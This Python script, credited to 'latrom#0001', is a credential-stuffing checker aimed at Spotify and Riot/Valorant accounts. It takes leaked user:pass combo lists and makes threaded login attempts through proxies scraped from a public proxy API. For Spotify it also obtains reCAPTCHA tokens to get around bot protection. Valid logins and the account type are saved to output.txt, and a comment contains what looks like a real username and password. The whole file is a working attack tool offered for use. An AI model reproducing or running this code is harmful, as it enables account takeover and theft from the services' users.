import requests, threading, re, sys, os, random, webbrowser, ctypes, json, subprocess, time

def spotify(username,password):#,proxyy):
    session = requests.Session()
    triple = random.randint(100,999)
    headersez={
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,fa;q=0.8',
        'Pragma': 'no-cache',
        'origin': 'https://www.google.com',
        'referer': 'https://www.google.com/recaptcha/api2/anchor?ar=1&k=6LfCVLAUAAAAALFwwRnnCJ12DalriUGbj8FW_J39&co=aHR0cHM6Ly9hY2NvdW50cy5zcG90aWZ5LmNvbTo0NDM.&hl=en&v=iSHzt4kCrNgSxGUYDFqaZAL9&size=invisible',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/'+str(triple)+'.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/'+str(triple)+'.36',
        'Content-Type': 'application/x-www-form-urlencoded'
        }
    try:
        f = session.get('https://www.google.com/recaptcha/api2/anchor?ar=1&k=6LfCVLAUAAAAALFwwRnnCJ12DalriUGbj8FW_J39&co=aHR0cHM6Ly9hY2NvdW50cy5zcG90aWZ5LmNvbTo0NDM.&hl=en&v=iSHzt4kCrNgSxGUYDFqaZAL9&size=invisible&cb=q7o50gyglw4p')#, proxies=proxyy, timeout=4)
    except:
        return("Bad Proxy!")
    token = (f.text.split('id="recaptcha-token" value="'))[1].split('">')[0]
    postdata = "v=iSHzt4kCrNgSxGUYDFqaZAL9&reason=q&c="+token+"&k=6LfCVLAUAAAAALFwwRnnCJ12DalriUGbj8FW_J39&co=aHR0cHM6Ly9hY2NvdW50cy5zcG90aWZ5LmNvbTo0NDM.&hl=en&size=invisible&chr=%5B89%2C64%2C27%5D&vh=13599012192&bg=!q62grYxHRvVxjUIjSFNd0mlvrZ-iCgIHAAAB6FcAAAANnAkBySdqTJGFRK7SirleWAwPVhv9-XwP8ugGSTJJgQ46-0IMBKN8HUnfPqm4sCefwxOOEURND35prc9DJYG0pbmg_jD18qC0c-lQzuPsOtUhHTtfv3--SVCcRvJWZ0V3cia65HGfUys0e1K-IZoArlxM9qZfUMXJKAFuWqZiBn-Qi8VnDqI2rRnAQcIB8Wra6xWzmFbRR2NZqF7lDPKZ0_SZBEc99_49j07ISW4X65sMHL139EARIOipdsj5js5JyM19a2TCZJtAu4XL1h0ZLfomM8KDHkcl_b0L-jW9cvAe2K2uQXKRPzruAvtjdhMdODzVWU5VawKhpmi2NCKAiCRUlJW5lToYkR_X-07AqFLY6qi4ZbJ_sSrD7fCNNYFKmLfAaxPwPmp5Dgei7KKvEQmeUEZwTQAS1p2gaBmt6SCOgId3QBfF_robIkJMcXFzj7R0G-s8rwGUSc8EQzT_DCe9SZsJyobu3Ps0-YK-W3MPWk6a69o618zPSIIQtSCor9w_oUYTLiptaBAEY03NWINhc1mmiYu2Yz5apkW_KbAp3HD3G0bhzcCIYZOGZxyJ44HdGsCJ-7ZFTcEAUST-aLbS-YN1AyuC7ClFO86CMICVDg6aIDyCJyIcaJXiN-bN5xQD_NixaXatJy9Mx1XEnU4Q7E_KISDJfKUhDktK5LMqBJa-x1EIOcY99E-eyry7crf3-Hax3Uj-e-euzRwLxn2VB1Uki8nqJQVYUgcjlVXQhj1X7tx4jzUb0yB1TPU9uMBtZLRvMCRKvFdnn77HgYs5bwOo2mRECiFButgigKXaaJup6NM4KRUevhaDtnD6aJ8ZWQZTXz_OJ74a_OvPK9eD1_5pTG2tUyYNSyz-alhvHdMt5_MAdI3op4ZmcvBQBV9VC2JLjphDuTW8eW_nuK9hN17zin6vjEL8YIm_MekB_dIUK3T1Nbyqmyzigy-Lg8tRL6jSinzdwOTc9hS5SCsPjMeiblc65aJC8AKmA5i80f-6Eg4BT305UeXKI3QwhI3ZJyyQAJTata41FoOXl3EF9Pyy8diYFK2G-CS8lxEpV7jcRYduz4tEPeCpBxU4O_KtM2iv4STkwO4Z_-c-fMLlYu9H7jiFnk6Yh8XlPE__3q0FHIBFf15zVSZ3qroshYiHBMxM5BVQBOExbjoEdYKx4-m9c23K3suA2sCkxHytptG-6yhHJR3EyWwSRTY7OpX_yvhbFri0vgchw7U6ujyoXeCXS9N4oOoGYpS5OyFyRPLxJH7yjXOG2Play5HJ91LL6J6qg1iY8MIq9XQtiVZHadVpZVlz3iKcX4vXcQ3rv_qQwhntObGXPAGJWEel5OiJ1App7mWy961q3mPg9aDEp9VLKU5yDDw1xf6tOFMwg2Q-PNDaKXAyP_FOkxOjnu8dPhuKGut6cJr449BKDwbnA9BOomcVSztEzHGU6HPXXyNdZbfA6D12f5lWxX2B_pobw3a1gFLnO6mWaNRuK1zfzZcfGTYMATf6d7sj9RcKNS230XPHWGaMlLmNxsgXkEN7a9PwsSVwcKdHg_HU4vYdRX6vkEauOIwVPs4dS7yZXmtvbDaX1zOU4ZYWg0T42sT3nIIl9M2EeFS5Rqms_YzNp8J-YtRz1h5RhtTTNcA5jX4N-xDEVx-vD36bZVzfoMSL2k85PKv7pQGLH-0a3DsR0pePCTBWNORK0g_RZCU_H898-nT1syGzNKWGoPCstWPRvpL9cnHRPM1ZKemRn0nPVm9Bgo0ksuUijgXc5yyrf5K49UU2J5JgFYpSp7aMGOUb1ibrj2sr-D63d61DtzFJ2mwrLm_KHBiN_ECpVhDsRvHe5iOx_APHtImevOUxghtkj-8RJruPgkTVaML2MEDOdL_UYaldeo-5ckZo3VHss7IpLArGOMTEd0bSH8tA8CL8RLQQeSokOMZ79Haxj8yE0EAVZ-k9-O72mmu5I0wH5IPgapNvExeX6O1l3mC4MqLhKPdOZOnTiEBlSrV4ZDH_9fhLUahe5ocZXvXqrud9QGNeTpZsSPeIYubeOC0sOsuqk10sWB7NP-lhifWeDob-IK1JWcgFTytVc99RkZTjUcdG9t8prPlKAagZIsDr1TiX3dy8sXKZ7d9EXQF5P_rHJ8xvmUtCWqbc3V5jL-qe8ANypwHsuva75Q6dtqoBR8vCE5xWgfwB0GzR3Xi_l7KDTsYAQIrDZVyY1UxdzWBwJCrvDrtrNsnt0S7BhBJ4ATCrW5VFPqXyXRiLxHCIv9zgo-NdBZQ4hEXXxMtbem3KgYUB1Rals1bbi8X8MsmselnHfY5LdOseyXWIR2QcrANSAypQUAhwVpsModw7HMdXgV9Uc-HwCMWafOChhBr88tOowqVHttPtwYorYrzriXNRt9LkigESMy1bEDx79CJguitwjQ9IyIEu8quEQb_-7AEXrfDzl_FKgASnnZLrAfZMtgyyddIhBpgAvgR_c8a8Nuro-RGV0aNuunVg8NjL8binz9kgmZvOS38QaP5anf2vgzJ9wC0ZKDg2Ad77dPjBCiCRtVe_dqm7FDA_cS97DkAwVfFawgce1wfWqsrjZvu4k6x3PAUH1UNzQUxVgOGUbqJsaFs3GZIMiI8O6-tZktz8i8oqpr0RjkfUhw_I2szHF3LM20_bFwhtINwg0rZxRTrg4il-_q7jDnVOTqQ7fdgHgiJHZw_OOB7JWoRW6ZlJmx3La8oV93fl1wMGNrpojSR0b6pc8SThsKCUgoY6zajWWa3CesX1ZLUtE7Pfk9eDey3stIWf2acKolZ9fU-gspeACUCN20EhGT-HvBtNBGr_xWk1zVJBgNG29olXCpF26eXNKNCCovsILNDgH06vulDUG_vR5RrGe5LsXksIoTMYsCUitLz4HEehUOd9mWCmLCl00eGRCkwr9EB557lyr7mBK2KPgJkXhNmmPSbDy6hPaQ057zfAd5s_43UBCMtI-aAs5NN4TXHd6IlLwynwc1zsYOQ6z_HARlcMpCV9ac-8eOKsaepgjOAX4YHfg3NekrxA2ynrvwk9U-gCtpxMJ4f1cVx3jExNlIX5LxE46FYIhQ"
    try:
        x = session.post('https://www.google.com/recaptcha/api2/reload?k=6LfCVLAUAAAAALFwwRnnCJ12DalriUGbj8FW_J39', data=postdata, headers=headersez)#, proxies=proxyy, timeout=4)
    except:
        return("Bad proxy!")
    rresp = (x.text.split('["rresp","'))[1].split('",')[0]
    if rresp == 'null':
        return("Recaptcha solver failed!")
    else:
        try:
            y = session.get('https://accounts.spotify.com/en/login')#, proxies=proxyy, timeout=4) for
        except:
            return("Bad proxy!")
        csrftoken = session.cookies['csrf_token']
        devid = session.cookies["__Host-device_id"]
        tpasess = session.cookies["__Secure-TPASESSION"]
        users = username.replace('@','%40')
        contlen = str(len('remember=true&continue=https%3A%2F%2Fwww.spotify.com%2Fapi%2Fgrowth%2Fl2l-redirect&username='+users+'&password='+password+'&recaptchaToken='+rresp+'&csrf_token='+csrftoken))
        postdata2 = 'remember=true&continue=https%3A%2F%2Fwww.spotify.com%2Fapi%2Fgrowth%2Fl2l-redirect&username='+users+'&password='+password+'&recaptchaToken='+rresp+'&csrf_token='+csrftoken
        headersez2 = {
            'accept': 'application/json, text/plain, */*',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-US,en;q=0.9,fa;q=0.8',
            'content-length': contlen,
            'origin': 'https://accounts.spotify.com',
            'referer': 'https://accounts.spotify.com/en/login/?continue=https:%2F%2Fwww.spotify.com%2Fapi%2Fgrowth%2Fl2l-redirect&_locale=en-AE',
            'sec-fetch-dest': 'empty',
            'Content-Type': 'application/x-www-form-urlencoded',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/'+str(triple)+'.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/'+str(triple)+'.36'
            }
        cookieseze = {
            'sp_t':'576b5e3d-a565-47d4-94ce-0b6748fdc625',
            '_gcl_au':'1.1.1585241231.1587921490',
            'sp_adid':'fbe3a5fc-d8a3-4bc5-b079-3b1663ce0b49',
            '_scid':'5eee3e0e-f16b-4f4c-bf73-188861f9fb0c',
            '_hjid':'fb8648d2-549b-44c8-93e9-5bf00116b906',
            '_fbp':'fb.1.1587921496365.773542932',
            '__Host-device_id': devid,
            'cookieNotice': 'true',
            'sp_m':'us',
            'spot':'%7B%22t%22%3A1596548261%2C%22m%22%3A%22us%22%2C%22p%22%3Anull%7D',
            'sp_last_utm':'%7B%22utm_campaign%22%3A%22alwayson_eu_uk_performancemarketing_core_brand%2Bcontextual-desktop%2Btext%2Bexact%2Buk-en%2Bgoogle%22%2C%22utm_medium%22%3A%22paidsearch%22%2C%22utm_source%22%3A%22uk-en_brand_contextual-desktop_text%22%7D',
            '_gcl_dc':'GCL.1596996484.Cj0KCQjwvb75BRD1ARIsAP6LcqseeQ-2Lkix5DjAXxBo0E34KCiJWiUaLO3oZTeKYJaNRP0AKcttUN4aAlMyEALw_wcB',
            '_gcl_aw':'GCL.1596996484.Cj0KCQjwvb75BRD1ARIsAP6LcqseeQ-2Lkix5DjAXxBo0E34KCiJWiUaLO3oZTeKYJaNRP0AKcttUN4aAlMyEALw_wcB',
            '_gac_UA-5784146-31':'1.1596996518.Cj0KCQjwvb75BRD1ARIsAP6LcqseeQ-2Lkix5DjAXxBo0E34KCiJWiUaLO3oZTeKYJaNRP0AKcttUN4aAlMyEALw_wcB',
            'ki_t':'1597938645946%3B1599140931855%3B1599140931855%3B3%3B3',
            'ki_r':'',
            'optimizelyEndUserId':'oeu1599636139883r0.3283057902318758',
            'optimizelySegments':'%7B%226174980032%22%3A%22search%22%2C%226176630028%22%3A%22none%22%2C%226179250069%22%3A%22false%22%2C%226161020302%22%3A%22gc%22%7D',
            'optimizelyBuckets':'%7B%7D',
            'sp_landingref':'https%3A%2F%2Fwww.google.com%2F',
            '_gid':'GA1.2.2046705606.1599636143',
            '_sctr':'1|1599634800000',
            'sp_usid':'ceb6c24c-d1b4-4895-bcb7-e4e386afd063',
            'sp_ab':'%7B%222019_04_premium_menu%22%3A%22control%22%7D',
            '_pin_unauth':'dWlkPVlUQXdaV0UyTXprdE1EQmxOaTAwWlRCbUxUbGtNVGN0T0RVeE1ERTVNalEwTnpBMSZycD1abUZzYzJV',
            '__Secure-TPASESSION': tpasess,
            '__bon':'MHwwfC0yODU4Nzc4NjN8LTEyMDA2ODcwMjQ2fDF8MXwxfDE=',
            'remember': users,
            'OptanonAlertBoxClosed':'2020-09-09T18: 37:10.735Z',
            'OptanonConsent':'isIABGlobal=false&datestamp=Wed+Sep+09+2020+11%3A37%3A11+GMT-0700+(Pacific+Daylight+Time)&version=6.5.0&hosts=&consentId=89714584-b320-4c03-bd3c-be011bfaba6d&interactionCount=1&landingPath=NotLandingPage&groups=t00%3A1%2Cs00%3A1%2Cf00%3A1%2Cm00%3A1&AwaitingReconsent=false&geolocation=US%3BNJ',
            'csrf_token': csrftoken,
            '_ga_S35RN5WNT2':'GS1.1.1599675929.1.1.1599676676.0',
            '_ga':'GA1.2.1572440783.1597938634',
            '_gat':'1'
            }
        t = session.post('https://accounts.spotify.com/login/password', headers=headersez2, cookies=cookieseze, data=postdata2)#, proxies=proxyy, timeout=4)
        
        
        
        
        if "errorInvalidCredentials" in t.text:
            print("fail")
        elif '"result":"ok"' in t.text:
            
            
            z = session.get('https://www.spotify.com/us/api/account/overview/')
            
            xxx=z.text.split('name":"')[1]
            yyy=xxx.split('","branding":')[0]
            print('Hittttttttt'+'  Acount type = '+yyy)
            output = open('output.txt', 'a+')
            output.write('\n'+'User:pass='+username+':'+password+'\n'+'account durumu ='+yyy+'\n')
            output.close()
        else:
            print("Rate surpassed or error occured!")
def valorant(username,password,proxyy):
    session = requests.Session()
    triple = random.randint(100,999)
    headersez={
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/'+str(triple)+'.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/'+str(triple)+'.36 OPR/71.0.3770.287',
        'Pragma': 'no-cache',
        'Accept': '*/*',
        }
    #damiantom88:kutas123
    postdata='{"type":"auth","username":"'+username+'","password":"'+password+'","remember":false,"language":"en_US"}'
    session.proxies = proxyy
    try:
        f = session.get('https://auth.riotgames.com/authorize?state=bG9naW4%3D&nonce=MjMzLDE5Nyw3OSwx&prompt=login&ui_locales=en-gb&client_id=play-valorant-web-prod&response_type=token%20id_token&scope=account%20openid&redirect_uri=https%3A%2F%2Fbeta.playvalorant.com%2Fopt_in', headers=headersez, timeout=4)
    except:
        return
    sessid=session.cookies['asid']
    headersez2={
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/'+str(triple)+'.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/'+str(triple)+'.36 OPR/71.0.3770.287',
        'Pragma': 'no-cache',
        'Accept': '*/*',
        'Content-Type':'application/json'
        }
    cookies2 = {'asid': sessid}
    f = session.put('https://auth.riotgames.com/api/v1/authorization',data=postdata, headers=headersez2,cookies=cookies2, proxies=proxyy, timeout=4)
    if 'auth_failure' in f.text:
        print("Fail!")
    elif 'access_token' in f.text:
        print('Hit!')
        output = open('output.txt', 'a+')
        output.write(username+'+'+password)
        output.close()
    elif 'rate_limited' in f.text:
        print('Rate limited!')
def comboload():
    combos = open(input("Combo Path: "), encoding='utf8', errors = 'ignore').readlines()
    User = []
    Pass = []
    for y in combos:
        ez = y.replace("\n", "").split(":")
        try:
            User.append(ez[0])
            Pass.append(ez[1])
        except:
            pass
    return User,Pass
def proxyload():
    proxychoice = input('Do you have https proxies? (yes/no): ')
    if proxychoice == 'yes':
        proxys = open(input("Proxy Path: "), errors = 'ignore').readlines()
        proxylist = []
        for x in proxys:
            c=x.replace('\n', '')
            y=c.replace("'",'')
            proxylist.append(y)
        return proxylist
    elif proxychoice == 'no':
        t = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=7000&anonymity=elite&ssl=no')
        print("Scraping Proxies from proxyscrap.com's api!")
        proxylist = []
        proxylist = t.text.split("\r\n")
        return proxylist
print("mortaLaio - By: latrom#0001")
print("[1] Valorant")
print("[2] Spotify")
choice1 = input("[?] ")
if choice1 == '1':
    print('-------------------Checking Valorant!-------------------')
    User,Passw = comboload()
    proxys3 = proxyload()
    print("Combo loaded, Size:"+str(len(User))+".")
    num = 0
    threadsnum = input("Threads :")
    while 1:
        if threading.active_count() < int(threadsnum):
                if len(User) > num:
                    randomproxy = proxys3[random.randint(1,len(proxys3))]
                    proxsel = {
                        'http': 'http://'+randomproxy,
                        'https': 'https://'+randomproxy
                        }
                    threading.Thread(target=valorant, args=(User[num], Passw[num], proxsel)).start()
                    num += 1
elif choice1 == '2':
    print('-------------------Checking Spotify!-------------------')
    print('links from forexamplefkk#3152')
    User,Passw = comboload()
    proxys3 = proxyload()
    print("Combo loaded, Size: "+str(len(User)))
    num = 0
    threadsnum = input("Threads :")
    while 1:
        time.sleep(5)
        if threading.active_count() < int(threadsnum):
                if len(User) > num:
 #                   randomproxy = proxys3[random.randint(1,len(proxys3))]
 #                   proxsel = {
 #                       'http': 'http://'+randomproxy,
 #                       'https': 'https://'+randomproxy
 #                       }
                    threading.Thread(target=spotify, args=(User[num], Passw[num])).start()
                    num += 1
                   
        else:
            print("Checking done!")
            time.sleep(5)